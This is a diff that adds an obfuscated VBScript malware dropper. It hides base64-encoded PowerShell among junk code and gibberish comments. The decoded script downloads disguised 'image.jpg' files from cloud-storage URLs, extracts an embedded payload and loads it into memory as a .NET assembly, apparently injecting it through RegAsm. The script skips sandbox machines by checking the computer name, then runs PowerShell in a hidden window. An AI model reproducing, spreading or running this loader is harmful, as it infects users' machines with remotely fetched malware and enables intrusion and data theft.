@@ -1,0 +1,387 @@
+  'eedfffvfdfddfsgfffdfdss
+Dim a, b, c, d
+a = 15
+b = 5
+c = a / b
+Randomize
+Dim list(6)
+For d = 0 To 6
+    list(d) = Int(Rnd * 30) + 10
+Next
+Dim totalSum
+totalSum = 0
+For d = 0 To UBound(list)
+    totalSum = totalSum + list(d)
+Next
+Dim finalVal
+finalVal = totalSum * (a - b)
+b = finalVal
+c = b / a
+AhieArbbIkh =  rRefgisseffffdhgjg211
+QpTfkLo = LCase("WhfdPdffeR") 
+BxEfvKm = Len("phdffom")   
+BdxfEfdvKm = Len("pdfdsddddhfom") 
+Call Ugfdfging("$dds" & "dgo " & pehbooFn(61) &  "'DQAKAFMAdABhAHIAd")
+Call Ugfdfging("AAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADUADQAKAFsATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4")
+Dim gjogkhhhm(8)
+Public Const dmkjpjnS = "rbndiap"
+opeddmfAkFnpnSFoekrAnmjanmpdokfFjSkbdddioofncdSSmmhckbcrfdpkmjhSkkeohmjaniiSp =  "f" & LenB("mArmkSc") & "hfg"
+'dcehmAman  kmdfgFjoj
+Dim kabgohkcc(9)
+Public Const ifAedked = "nkmrjSjm"
+bmfriSmccaSaFnFkIdmIpghrakhSIkfakImmkjIirdcdmeASoeSompFdmmrFpnikIAicbiehacadeefmnhjnkpnamraArFIek =  "f" & LenB("pjnddAeSk") & "hfg"
+'niocphgm  ihddIciif
+Dim iifpdimh(7)
+Public Const nIkarjeo = "abdjIcr"
+kmmkbkmgdknomIajaIIbnodkFAfIafAmgkndkAIkkkmoddidSkdkSadbamndjcgAnbheeeIcabjbb =  "f" & LenB("fmbojIh") & "hfg"
+'cgmfmmI  dipfoeob
+Dim cmdpIAa(8)
+Public Const pAobadhkn = "ahAmfnb"
+krkAridmFmdjojIajbpokjmSmAbfffrdnjmAhahfcIempFmcfhnIpSjgfkkdhoopIiFdAmkiIimFfSiobSaArAdoa =  "f" & LenB("frFnnAmdn") & "hfg"
+'rfardipd  agkmafb
+Call Ugfdfging("AdABNAGEAbgBhAGcAZQByAF0AOgA6AFMAZQBjAHUAcgBpAHQAe")
+'ApecISkb  bIiiiFk
+Dim mmcIFee(9)
+Public Const kFSAFAjf = "ggjFSgimj"
+jjimkfnbkrrjFSjjrAhcdbrpdkcSmFdmkrimdrfpkFffkmjgSmgiarphkrkSdonInfIeoAoSkkkFdmSSbdSapdkAcambagkFi =  "f" & LenB("mrjbfrb") & "hfg"
+'FgkharneI  rFioncr
+Dim ddcnbnSjf(8)
+Public Const dnhInFmb = "AcidcFim"
+kghicgdjSpgcdSihfcfdejfdbgkkIokFrajfpbcmIFdFprFAIbFakegfbmgdpikiSiicndkdSrjgphehjrrkrkfmreddIhFjfjA =  "f" & LenB("ghdipiraA") & "hfg"
+'dapIhAj  FkSkgcFj
+Dim iSnipdabe(8)
+Public Const iAaohbhS = "pgrrnjdmA"
+aIgrpdkjSpmiiddAjiiAdnokrpmdkmnrnrdgImrdnehkkpgdAIdbjFdkdpaaghrdccdkhneApojoedecikfFrmgknhcdkrmfke =  "f" & LenB("iidpdjo") & "hfg"
+'ejdkofakF  ppbmkodc
+Dim cSjbkFce(8)
+Public Const caImgImmh = "mbkeScb"
+kncFdprInrmmSmInrgkefopFIfnSniFcFiiFdfakhagofamdInIAnFdbAecFcrfediAodmrkfSFfhapriIfSoSoS =  "f" & LenB("ogAocdi") & "hfg"
+Call Ugfdfging("QBQAHIAbwB0AG8AYwBvAGwAIAA9ACAAWwBOAGUAdAAuAFMAZQBjAHUAcgBpA")
+Call Ugfdfging("HQAeQBQAHIAbwB0AG8AYwBvAGwAVAB5AHAAZQBdADoAOgBUAGwAcwAxADIADQAKACQAYgA2ADQAPQ")
+eggbaambarkabomScdgdarSpAkcokmdifebhnrAShmcpjofmkgpmmhgmhkchFAieAgImmekjegkeoh =  "f" & LenB("eijfFieg") & "hfg"
+'nAAoSmo  objkArddi
+Dim hkmfhnmc(8)
+Public Const FamIApb = "aSprmAAf"
+odoearpoaoaFjnASSbdkSidkkikAcjAkjfgkrimifjkeFrpkbpIIcffeSAIkgrmopomegmgofkkoFpdrrSFkpehd =  "f" & LenB("Sbkdodb") & "hfg"
+'nFmngfke  oidmkdkgh
+Dim cbAhdbAj(7)
+Public Const gieeakabi = "Fkacnmg"
+dhbmrphhIcknfIrdAdSFgSnFdjgFSgfnopmmakrkamkFIkmpeFcAopamIdhghjhmmdSogedkjgmjmkdrokrcdhSAppImdkhom =  "f" & LenB("SbpkghSck") & "hfg"
+'ngIphcap  rpkfhnda
+Dim ApjAhSAf(8)
+Public Const FnomfgirS = "kIreahkmm"
+IrFgpmmkhrndiohmrdmnjjgSfmIkmAhIbdefhpAcSdApemceikgmehchjAaIrbojjdcnibecFinpk =  "f" & LenB("kdjIobe") & "hfg"
+'kdnIrFmip  djAenfiIo
+Dim mgmdpdImF(7)
+Public Const IdoacSjr = "ofhmkfdmr"
+Call Ugfdfging("AnAGQAWABOAHAAYgBtAGMAZwBVADMAbAB6AGQARwBWA")
+Call Ugfdfging("HQATwAzAFYAegBhAFcANQBuAEkARgBOADUAYwAzAFIA")
+Call Ugfdfging("bABiAFMANQBTAFoAVwBaAHMAWgBXAE4AMABhAFcAOQ")
+Call Ugfdfging("B1AE8AMwBCADEAWQBtAHgAcABZAHkAQgBqAGIARwBGAHoAYwB5AEIARQBiADIAMQBoAGEAVwA1AE0AYgAyAEYA")
+Call Ugfdfging("awBaAFgASgA3AGMASABWAGkAYgBHAGwAagBJAEgATgAwAFkAWABSAHAAWQB5AEIAQgBjADMATgBsAGIAVwBKAHMAZQBTA")
+Call Ugfdfging("EIATQBiADIARgBf#AFEAWABOAHoAWgBXADEAaQBiAEgAawBvAFkAbgBsADAAWgBWAHQAZABJAEcARQBwAGUAMwB")
+Public Const oamfrcdao = "AAhieebn"
+rknbSagrFkcdjbkkddbrgrhfbkiFndfgokobgmpSnndpbfdmkpnjdhfadgSgkidIfdfImjiSebdIFkdmnmkFomdfjoASmhhei =  "f" & LenB("bjfSjibf") & "hfg"
+'ofbemdkd  dIdFgdjk
+Dim ShFkjdmr(9)
+Public Const SidfAmcd = "jpaobbFk"
+kmrodgcFaoabkomjihedhfegpampddoAkkaokgokfAehmbrddofImIdfpjAdImrfabpSngScInFiaFkogrmnnmbkhdAahjAIeS =  "f" & LenB("gIjrfnp") & "hfg"
+'cShmIer  Aimbpdke
+Dim aAkIhAd(8)
+Public Const ioddaord = "okhAkmI"
+mnofcSnmcbgcImbmekhorroddfegohefhfccecmddIacrkSkmAcgcgacAjbFIffdmbdmjShcmmISrm =  "f" & LenB("kkfmIpeA") & "hfg"
+'cbfSdIaS  aomegkkk
+Dim gnpajoma(9)
+Public Const jkSjpfkoo = "FSIfjdn"
+cFkemmeISdffaemmneordoiIcFojkAfmIbFncgnFfejmafojikebmcImnrcoAdbbnjmAgAigpkkoemImheafrdSk =  "f" & LenB("hjajdSSkc") & "hfg"
+'hgoIpcjb  AjdpegaA
+Dim ggrdmhij(9)
+Call Ugfdfging("KAGwAZABIAFYAeQBiAGkAQgBCAGMASABCAEUAYgAyADEAaABhAFcANAB1AFEAMwBWAHkAYwBtAFYAdQBkAE")
+Call Ugfdfging("UAUgB2AGIAVwBGAHAAYgBpADUATQBiADIARgBf#AEsA")
+Call Ugfdfging("RwBFAHAATwAzADEAOQAnAA0ACgBBAGQAZAAtAFQAeQBwAGUAIAAtAFQAeQBwAGUARABlAGYAaQBuAGkAdABpAG8AbgAgACgAWw")
+Call Ugfdfging("BUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVAB")
+Dim ojchadh(7)
+Public Const kjifmfmd = "mArcdhSFo"
+mdimSFcmagAdgkadkpfdjpcfmdmddboommmeIdmmgimAFSokkgirIremrcpebhaArhpIpmapcrFaceiFejcmrmmdhSkpdhkAho =  "f" & LenB("enhddmfI") & "hfg"
+'oaddrmII  Skfnemmmk
+Dim pijkdgS(8)
+Public Const knSdnjofg = "AgdSdfA"
+mjhIkdihbmidmmgIImmenSfncaffokFgijnbkmgFeprabjrjkmackbjFddkkncIjpbdchfhgnoaFgemkgmobpIphSkAkdohbFh =  "f" & LenB("jappbkeIo") & "hfg"
+'bbnoAga  jrmkIFjkc
+Dim khpkSgASS(8)
+Public Const dkbpIdF = "FenfkbS"
+iddonfomodmjdogoIdnpddAdSidmrmfkphfkdriIigFFchagoodcFjmomipejrdrAmddhpIbIIfmAbkpimfcbcIemkdkbeikkd =  "f" & LenB("SgneSSd") & "hfg"
+'rhdeSpdk  amFkkkd
+Dim bphkdhaoj(7)
+Public Const oiIcjbdn = "ghiIpamaS"
+IaikedmdeAFhdmrIrppmrgSkieihakodpmnSfSiogAfcgfcdpaFjFegmbkbajedrhbkhArnIfaodbmidbokaneAk =  "f" & LenB("nbFnFhec") & "hfg"
+'dmdfndm  Akddmom
+Call Ugfdfging("GADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbw")
+Call Ugfdfging("BtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABiADYANAApACkAKQANAAoAZ")
+'cgrrdiSbk  hIcpmkdoF
+Dim njFpnAjgf(7)
+Public Const edgbcae = "cmFciri"
+gmeFcfepjcdrgjmrdhncdAifpckjpfkmmbocibgbbnIegirdodcdmpnhdAfSIIadpgFfdihrakafe =  "f" & LenB("eSfjpdkdk") & "hfg"
+'kemgSjdh  ggmooamk
+Dim afdiIjohc(7)
+Public Const AASodSnS = "AokrmjFAr"
+drrpoSIAookIFgoeeakmrdgSopjdImdFkbfmomhSepnjFfagbmhjjbSakIaAnSebIIhmaIprkmpbombipdrfejk =  "f" & LenB("ibfjdki") & "hfg"
+'kfkkkcAd  ghFprAk
+Dim Fjorphjf(7)
+Public Const AFihAddhm = "fgaipce"
+AkkmiiokmAddmcmbbSmogdSikaajkAbghiIdmnFogrdapSkrieSicmFcmbjhheeomFmmhkencAgoaSImogafSrdd =  "f" & LenB("kkkIdnfc") & "hfg"
+'medIkAjka  jfeehcmh
+Dim FIadApdrk(7)
+Public Const akSjjord = "bddaapFhf"
+nkSocnekfIeSooaadAIroakmaggkhmcddrckIcAcdSddmemfdSfrdppmdmnmgmcikbdmmhgkapFpFmSmdbFipjS =  "f" & LenB("ebpFgnbm") & "hfg"
+Call Ugfdfging("gB1AG4AYwB0AGkAbwBuACAAZAAoACQAbAApAHsAJAB3AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4A")
+Call Ugfdfging("ZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAoAEcAZQB0AC0AUgBhAG4AZABvAG0AIAAkA")
+Call Ugfdfging("GwAIAAtAEMAbwB1AG4AdAAgACQAbAAuAEMAbwB1AG4AdAApAHwAJQB7AHQAcgB5AHsAcgBlAHQAdQByAG4AI")
+Call Ugfdfging("AAkAHcALgBEAG8AdwBuAGwAbwBhAGQARABhAHQAYQAoA")
+Call Ugfdfging("CQAXwApAH0AYwBhAHQAYwBoAHsAfQB9AH0ADQAKAGYAdQBuAGMAdABpAG8AbgAgAGkAKAAkA")
+Call Ugfdfging("GEALAAkAHQALAAkAG0ALAAkAHAAPQBAACgAKQApAHsAJAB5AD0AWwBEAG8AbQBhAGkAbgBMAG8AYQBkAGUAcgBdADoAOg")
+Call Ugfdfging("BMAG8AYQBkAEEAcwBzAGUAbQBiAGwAeQAoACQAYQAp")
+Call Ugfdfging("ADsAJAByAD0AJAB5AC4ARwBlAHQAVAB5AHAAZQBzACgAKQB8AD8AewAkAF8ALgBGAHUAbABsAE4AYQBtAGUAIAAtA")
+Call Ugfdfging("GUAcQAgACQAdAB9ADsAJABuAD0AJAByAC4ARwBlAHQATQBlAHQAaABvAGQAKAAkAG0ALAAoAFsAUgBl")
+Call Ugfdfging("AGYAbABlAGMAdABpAG8AbgAuAEIAaQBuAGQAaQBuAGcARgBsAGEAZwBzAF0AJwBQAHUAYgBsAGkAYwAsAE4Abw")
+Call Ugfdfging("BuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMALABJAG4AcwB0AGEAbgBjAGUAJwApACkAOwAkAG8APQBpAGYAK")
+Call Ugfdfging("AAhACQAbgAuAEkAcwBTAHQAYQB0AGkAYwApAHsAWwBBAGMAdABpAHYAYQB0AG8AcgBdADoAOgBDA")
+Call Ugfdfging("HIAZQBhAHQAZQBJAG4AcwB0AGEAbgBjAGUAKAAkAHIAKQB9ADsAJABuAC4ASQBuAHYAbwBf#AGUAKAAkAG8ALAA")
+Call Ugfdfging("kAHAAKQB9AA0ACgANAAoAJABf#AD0AQAAoACgAJwBoAHQAdABwAHMAOgAvAC8AZgBpAHIAZQBi")
+odehjpbrmjaaSdmbpIbaFibmFbriIkffkfFFmFedknooImkehmddrcdfIikiArAdeInrFAeIoAhidkbapmbFnknikkcmjdeSp =  "f" & LenB("IiShrhi") & "hfg"
+'kjedIjkgg  jrkpagr
+Dim fegemrhI(7)
+Public Const Iiraccr = "FekfdfIoa"
+fdeacrhpmprckcmAbkairjeermgAIdmmofAbmhpabcnkiokbehbIrehmoagfkimhdfnfdkkrdahoF =  "f" & LenB("ImdjeIkbI") & "hfg"
+'djFckkb  jnkgegcb
+Dim eFrFhAk(8)
+Public Const mIAmedmf = "pjgjkdhb"
+SSkjmkgkkrcehaordcnddpgFngbFAFkFFmrFkmeekfikbpAodnohpdFikIFeojInaehkhkbhFhrAfdmFimbjhhgr =  "f" & LenB("ShfFpapam") & "hfg"
+'mkmhkfd  kgjgkSd
+Dim FFSdciifk(9)
+Public Const FomSkdkFk = "rjjianFf"
+FAbASgaeiakenpdpISIAgrhonprnrmFjFmmjdIFgmIbdakdbgdpbISSdpkiinkmmcfgkdrkSbmkmp =  "f" & LenB("domkkgFFm") & "hfg"
+'pAFhdkj  mraffbIik
+Dim FnhpSgm(7)
+Public Const knkFnAFe = "oSgoidmAd"
+Call Ugfdfging("AGEAcwBlAHMAdABvAHIAYQBnAGUALgBnAG8AbwBnAGwAZQBhAHAAaQBzAC4AYwBvAG0")
+Call Ugfdfging("ALwB2ADAALwBiAC8AcgBlAG0AYQBzAGQALQA2AGMANwAwADIALgBmAGkAcgBlAGIAYQBzAGUAcwB0AG8AcgBhAG")
+Call Ugfdfging("cAZQAuAGEAcABwAC8AbwAvAGkAbQBhAGcAZQAuAGoAcABnAD8AYQBsAHQAPQBtAGUAZABpAGEAJgB0AG8Aaw")
+Call Ugfdfging("BlAG4APQBmADQANwA4ADkANQA3AGIALQBkADQAZAA5AC0ANAA0ADAAYQAtADkAYwAxADQALQA5AGUAMgBkADQAOAA2ADg")
+Call Ugfdfging("AZAA3ADYAMAAnACkALAAoACcAaAB0AHQAcABzADoALwAvAGYAaQByAGUAYgBhAHMAZQBzAHQA")
+Call Ugfdfging("bwByAGEAZwBlAC4AZwBvAG8AZwBsAGUAYQBwAGkAcwAuAGMAb")
+Public Const hgfSpArhb = "rbkdAhFp"
+IFdeafSpSinncpidmdfepgcdgnrhnIbbknpIekhagikoddSckggdckSkdiFknpbehmmnSpSmmeAgpn =  "f" & LenB("pmoppgmg") & "hfg"
+'AandSdIm  mkgkgkSjc
+Dim bhjAFIrmf(8)
+Public Const IjFFadk = "andamkdb"
+SkgSdgSmdnoAbhagdhrbhAppmIfcdjfidiSfmrkSdArhjmprnnenAcrabpkibmhIhedriddcprgjfgf =  "f" & LenB("kdmoperkb") & "hfg"
+'pAdmfhAA  oSafbFirr
+Dim cAfmhdd(7)
+Public Const jdfngrnoI = "rcjkAmh"
+dhdffSpfcFFcdefgchkkbikFjkkhdAadgojmmoojeSjidkdnmdhhkifjkAmdngkemcdedrInIbfcSgcApAdaorhFiamoIdFFn =  "f" & LenB("fnrppIda") & "hfg"
+'dnicckid  FdomkocIA
+Dim dImeISe(8)
+Public Const iorrjgae = "aSddSIfom"
+ImpgjcpjArdSAmaoeInrpjodjkkdSdeoeijAiFAkcgkofecdIoISkmmhfmFSpdkdneInjcfgmcpiSaF =  "f" & LenB("eihbjaeFh") & "hfg"
+'nbkFaSmgm  gaaknrp
+Dim imdofmi(8)
+Call Ugfdfging("wBtAC8AdgAwAC8AYgAvAHIAZQBtAGEAcwBkAC0ANgBjADcAMAAyAC4AZgBpAHIAZQ")
+Call Ugfdfging("BiAGEAcwBlAHMAdABvAHIAYQBnAGUALgBhAHAAcAAvAG8ALwBpAG0A")
+Dim AFicFSjc(9)
+Public Const cdfSIcIro = "dfkmIapj"
+faFbfddhFkrpaAofimkkkfafrjmdeoemrrkSmamhcpmpacomkjdgiSrSSkimSadhgFFhgpriphobjieomakIkFmISkSmpSibkm =  "f" & LenB("idfgnardp") & "hfg"
+'aikopmI  aAnjFijc
+Dim hokFrpSmo(9)
+Public Const Faahokkap = "gkjgchimS"
+jnbpSIdASidbSaFckomjjmcifcAramhnmknSmfbfepmbfogjmejIFjnAjrjmmjFkagfhkFojnffIaadkdmembokjcpndmeiIIa =  "f" & LenB("aAhSSopSe") & "hfg"
+'pedFinra  ifbikpdfd
+Dim iInhmkaS(9)
+Public Const afhmnofb = "iafhIegd"
+danrpngnrdfmjmIrIAihjedpmgconAbemjedAghkAIcjiikmfmnmdArSeFFhkkSdbbhakSdkoAjpbjgkpoibjfiokfoajaSfIg =  "f" & LenB("hgbpdgkb") & "hfg"
+'gFnbFdok  rFhAjdrIh
+Dim kiIboAd(9)
+Public Const mIbaiaIb = "ihSkaoh"
+djSgcFmFmoghiAASrSifcrobkcgnbmfrrcnicgmgaFojbkjdkhgmkifcdFpSpgdkhoofinFkcceedeSSrdcroIbhFknepmprcFc =  "f" & LenB("mcdIFkmi") & "hfg"
+'oeaSpApgm  ebbonghAa
+Call Ugfdfging("YQBnAGUALgBqAHAAZwA/AGEAbAB0AD0AbQBlAGQAaQBhACYAdABvAGsAZQBuAD0AMgAwADYANgA0AGQAOABiAC0AOQ")
+Call Ugfdfging("BmADUAMQAtADQAZgBjADAALQA4ADQAMwA5AC0AMwBjAGMAYQAxADQAZQBhADcAZ")
+Call Ugfdfging("gBjADQAJwApACkADQAKAGkAZgAoACgAJABnAD0AZAAgA")
+Call Ugfdfging("CQAawApAC0AYQBuAGQAKAAkAHQAPQBbAFQAZQB4AHQALgBFAG4AYwBv")
+Call Ugfdfging("AGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABnACkAKQAtAG0AYQB0AGMAaAAnADwAPABC")
+Call Ugfdfging("AEEAUwBFADYANABfAFMAVABBAFIAVAA+AD4AKAAuACoAPwApADwAPABCAEEAUwBFADYANABfAEUATgBEAD4APgAnACkAewANAAo")
+Call Ugfdfging("AIAAgACAAIABpACAAKABbAEMAbwBuAHYAZQByAHQAXQ")
+Call Ugfdfging("A6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQA")
+'kFmFcFf  ebSkaomkp
+Dim iakoihk(8)
+Public Const icdffeSf = "hhdIFrmr"
+acigimndnbFheAmmifddgkSScrhrIcdFFgkmabgmoakehpbjmhjkokjiciepddajgakFkhkgAgfgSdkkkAfkrcg =  "f" & LenB("eFbjkmpkI") & "hfg"
+'SfFhedAdm  cIhjdig
+Dim kISfnor(7)
+Public Const erfaiAd = "kgomgrAh"
+fmabooiAIIrcSckkeimroAdnfakmrAmpiimkfkadmdmfkdmhodgFffIhhkmnAmedFbIppefriimdk =  "f" & LenB("FmkehFokS") & "hfg"
+'jdpdcdpkf  Sokipafk
+Dim jAnnFiA(9)
+Public Const FkojhoS = "pdAppam"
+bkcFcFfdnfjSkmkcjnIkgkefdpSAmkSjfehmkpIkkcFhSiAmSbmcmhejfmImFggcfarkeepddhSeI =  "f" & LenB("mfIrmSkA") & "hfg"
+'FnFSFfoFf  niddcSp
+Dim mhdjrhm(8)
+Public Const hapipad = "jhmdhkdkg"
+AaAndoiAIgcfeeafoaoAgFSmkdbSkInmaamiIIrrkkpiFnecdFIjfmSabbbknjgargedhpkdhmgpgpAFAAdIScom =  "f" & LenB("bmhrrbegj") & "hfg"
+Call Ugfdfging("TQBhAHQAYwBoAGUAcwBbADEAXQApACkAIAAnAHQAZQBzAHQAcABvA")
+Call Ugfdfging("HcAZQByAHMAaABlAGwAbAAuAEgAbwBhAGEAYQBhAGEAYQBzAGQAb")
+Call Ugfdfging("QBlACcAIAAnAGwAZgBzAGcAZQBkAGQAZABkAGQAZAB")
+Call Ugfdfging("kAGEAJwAgAEAAKAAnAHQAeAB0AC4ATQAwADIAJQBJAGQAZgByAGQAbQBvAC8A")
+hnmdShbSfgrbAonhoaFoSApAgFrdFkfccjdomkfdApkkjkidoFbAhbaiFFmcpfcnaoAmdAkddrkim =  "f" & LenB("enmmnfSp") & "hfg"
+'gdbjjrA  odnrmAjmm
+Dim FhpjAdpip(8)
+Public Const mriaobS = "cFrdmbif"
+mopdSmoIrhpfporcdrdnSooomriakakdSiFhnkjdgApkAmineppdgdfAaakfknbkkmgfkiorgSgbSFp =  "f" & LenB("phmdbjn") & "hfg"
+'mdcShmIdh  rmAacocm
+Dim mbAFgneSc(7)
+Public Const ibAoIag = "dhcdrabA"
+ckneaFnbfaSamkeoASfcrfrSmkmIkScdSSIpaSSemSkodSdmcmfrdAfmAnihbIogFdbmFooAabgrocemFikSriaaIFkkopdbjjk =  "f" & LenB("pAgomAgkr") & "hfg"
+'kmgmimkk  cpnmdaIa
+Dim AchjAfhej(8)
+Public Const nAoIdakk = "gifomcbe"
+kAImdmFnoodAgdkecjdomFSobmmpmjcagekgnhfbabenfmjmAamkhmhnAeIhpfaemdkbhdkIdrndrjhokirmFpkIF =  "f" & LenB("FhinAkI") & "hfg"
+'aabkmhdI  hrgoAnm
+Dim mmeFfnn(9)
+Public Const gmcFejmh = "fegdIriFr"
+Call Ugfdfging("bgBpAGEAbQAvAHMAZABhAGUAaAAvAHMAZgBlAHIALwA0ADIAMAAyAHkAbwByAHAAL")
+Call Ugfdfging("wA0ADIAMAAyAG8AbgBhAHIAZQB2AHcAZQBuAG8AdABjAGUAeQBvAHIAcAAvAG0AbwBjA")
+Public Const Irefmkf = "mekanAFm"
+akAgkiIkdIShfiimregkpaIkfpgeaejmgrmijfkkafbkniSmmoghpemaAmabbokAicannSkmrokjAgAFpdijFbfb =  "f" & LenB("mdkAejo") & "hfg"
+'kIccjhk  AFddpan
+Dim kbkodjgfb(7)
+Public Const bhFSrrmm = "ggSepmdm"
+oemkfbjemirdhbahfrbdnhrfipnhaimfmcnejImSFrkiareegkSFdhSfmpconbddmmgfmdAmFbAmFifpkhaiiAje =  "f" & LenB("chrIpfjdn") & "hfg"
+'hmmkArmr  marjcidjk
+Dim cebIIob(7)
+Public Const ccdbdmppc = "gomremon"
+kFFkISSoidceIInfjidnjnpjcgmdpkgpomcmkjhdemdrmjimafgmkbccgmokdeAkmmpfkkoaakiFrFF =  "f" & LenB("kAhIijkA") & "hfg"
+'niSoddm  SSodmadcd
+Dim hkfdSrfij(9)
+Public Const pFndjofj = "obFrcje"
+erihoaFmmmkkdkAmdodmAhdoaFkjIecefaoghAdiIbkhSFcIkeIdSFgFndgrokcpjfjcbpmedIImkmocIrInkSfiIrInpbdhA =  "f" & LenB("aFIkSra") & "hfg"
+'knhedjeke  dAFknekS
+Dim bihFSor(8)
+Call Ugfdfging("C4AdABuAGUAdABuAG8AYwByAGUAcwB1AGIAdQBoAHQAaQBnAC4AdwBhAHIALwAvADoAcwAnACwAIAAnADA")
+Call Ugfdfging("AJwAsACAAJwAnACwAIAAnAFIAZQBnAEEAcwBtACcALAAgACcAMAAnACAALAAg")
+Call Ugfdfging("ACcAeAA4ADYAJwApAA0ACgAgACAAIAAgAEcAZQB0AC0AUAByAG8AYwBlAHMAcwB8AHMAbwByAHQAIABD")
+Call Ugfdfging("AFAAVQAgAC0AZABlAHMAYwB8AHMAZQBsAGUAYwB0")
+Call Ugfdfging("ACAALQBmAGkAcgBzAHQAIAA1AHwAZgB0ACAATgBhAG0AZQA")
+Call Ugfdfging("sAEMAUABVACAAfQANAAoADQAKACAAIAAgACAAIAAgACAAIAAgACAA';iex  ([system.T")
+Dim ISdidfIIc(9)
+Public Const ikFjphed = "cngbjid"
+bkddjdiIgSkrdIkadkkfjiknrkdroFphopgkcShhaAojeobbkndoIdIkdpbSSpdjhccmkaAechfmdfi =  "f" & LenB("ciIgbIa") & "hfg"
+'ojFoFkF  ihiIdcbk
+Dim nojpSkkAg(9)
+Public Const FnfSofhbk = "gnrpmckg"
+ISmrpdgpmdmkdocmprieFIcbrmdnIAIhdkrkcngiShIckoFrjeacrfiaFdSciImAjngcFkjbkSfoaSocobcoFpoAgkogodafkd =  "f" & LenB("kAhImIdSk") & "hfg"
+'ISdaFeF  nhpgadSi
+Dim mebcmhSa(9)
+Public Const cehkdme = "idAAmAmk"
+kbkpkoedFSSAkkkmiISkdoncrcgmbmcjimjadrhjAijrdFnkcknbSdmcnoFnhkramnoegpkkknrkdmgdoojpgakn =  "f" & LenB("pgmedIcfk") & "hfg"
+'jmfghjkIF  pjbjSkh
+Dim cSrgcrdcb(7)
+Public Const nSdmFrkmI = "rSamfdAm"
+jjakegmFkIiSokbdfdjhgaASopfkgoroifhjbohkgpeAbnebAFgkIpojkbmnbdocadohhkbkkrapdaFbkdIjhgm =  "f" & LenB("IkAAarIp") & "hfg"
+'dbbFgAFrf  mpSaoAoj
+Call Ugfdfging("ext.encoding]::Unicode.GetString([system.")
+Call Ugfdfging("c")
+Call Ugfdfging("onvert]::Fromba" & pehbooFn(115))
+Call Ugfdfging("e" & pehbooFn(54) & "4" & pehbooFn(115) & pehbooFn(116) &  pehbooFn(114) & pehbooFn(105) & pehbooFn(110) & pehbooFn(103) & "(    $dds")
+Call Ugfdfging("dgo" & pehbooFn(46) & "replace('f#','r') )));")
+'Call Ugfdfging("po" & pehbooFn(119) & "er" & pehbooFn(115))
+'Call Ugfdfging("he" & Delectable(108) & Delectable(108) )
+'Call Ugfdfging(".e" & pehbooFn(120) & "e  $OWjuxD")
+'Call Ugfdfging("iex $OWjuxD") 'remove this, enable others
+'Call Ugfdfging(" .e" & pehbooFn(120) & "e -windo" & "wstyl" & pehbooFn(101) & " hi" & pehbooFn(100) & pehbooFn(100) &  "en -e" & pehbooFn(120) & "ec") ' remove space before .e 
+'Brugervenligere = Trim("Preftures") 
+Set wshNetwork = WScript.CreateObject( "WScript.N" & "etwork" )
+'Phffdfafegdodspfore! crizzling
+'Gaffdfdfucdfho mooafnwalks unobsequiousness outwitter106
+'Scffdfdfgigadfge corfpuscular hained
+'Quafftgffch anfavisningsret29
+Const Micfffdrgadfffoffafspace = "gfsfs kakados,"
+Const Prfffffogfdgliferating = &HFFFF0A52
+str = wshNetwork.ComputerName
+Const Bofrffdfftfslber161 = &HFFFF195F
+Const Unfffmfatfdronlike = 25821131
+If  instr(ucase(str), "MA" & "A1") > 0 OR _
+ instr(ucase(str), "C"  & "AV") > 0 OR _
+ instr(ucase(str), "LN" & "P2")> 0 OR _
+ instr(ucase(str), "-" & "PC") > 0 Then 
+WScript.Quit      
+End if
+Const stfafdsfsgfandfggfdbiddene = "glutfsfffdDgifsdfnfffshageligses! vrdireduktidoners whereon."
+Const Nidsdffgesgsffffdlss = "Orkerfsdddsffgfdffdfdsonffian aboulic"
+Const Adfsfdfmgpfaffhaigastria = "LeaddfsdfddgDfffdsefad: syncfhronizations"
+Const Sdfsffdlfgfdgfsdfgafdtfsprgets = "Sosdgffffffcfddgfffsdfdrager vehfter nub,"
+Dim dhhss 
+dhhss = "ri" & "pt." &  "Shell" 
+Set dfgddfgfddfgdd = CreateObject( pehbooFn(87) & "" & pehbooFn(83) & pehbooFn(99) & dhhss)
+ScjcckmgfjkF = pehbooFn(112) & pehbooFn(111) & pehbooFn(119) & ""  & pehbooFn(101) & ""   & "r" & "" & ""  & ""   & pehbooFn(115) & ""  & "he" & ""  & Delectable(108) & Delectable(108) & Delectable(32) & Delectable(34) & AhieArbbIkh 
+'Candiru curdlers wolframmet214
+Singesmetylalkoholausterl225 = FormatCurrency(4254)
+GrXnYl = Right("invisible", 3)                ' Last N characters
+AfLtPu = Space(10)                            ' Generate 10 spaces
+WsQuGb = StrReverse("echo")
+dfgddfgfddfgdd.Run  ScjcckmgfjkF,0 
+Function delectable(Mfgfdf97)
+    ' Return the character for the given code (unchanged behavior)
+    Delectable = Chr(Mfgfdf97)
+    ' Rearranged / altered no-op lines, still using the same variables
+    Skibstmrerssttte = "gfdsm" & Skifdbfmrerssttte & "Gfdfflgdors"
+    ' Another meaningless assignment, same variable retained
+    Daabsvidnesvolfxdvbasadah = Coadasdand
+    ' Slightly different comment formatting
+    '   Indfafkulr: overdevelop; optagning; knikserens; spirillum
+End Function
+Function pehbooFn(bjSSdmmiho)
+'Dispdauperise yourselves langtfra
+pehbooFn = "_"
+cultirostralrigmorsdobb = Trim("Fdfffgdds") 
+Do Until asc(pehbooFn) = bjSSdmmiho
+'Spddddfsus assoffgively ideopraxist eyebolt nonapostolical;
+Karfotifn5 = int(rnd*4000)
+'Liddmdli; bondepsigen sangskriveres spurgewort
+If Karfotifn5 < (258-3) then 
+GrXnYl = Right("invfidfsible", 3)                ' Last N characters
+AfLtPu = Space(10)                            ' Generate 10 spaces
+WsQuGb = StrReverse("efcafho")
+pehbooFn = Chr(Karfotifn5)
+end if 
+'Realdgiffdszed. stengulveneg214 miljministeriers bssekolbers
+Loop 
+End Function
+Function Ugfdfging (Mfgfdf97)
+AhieArbbIkh = AhieArbbIkh & Mfgfdf97
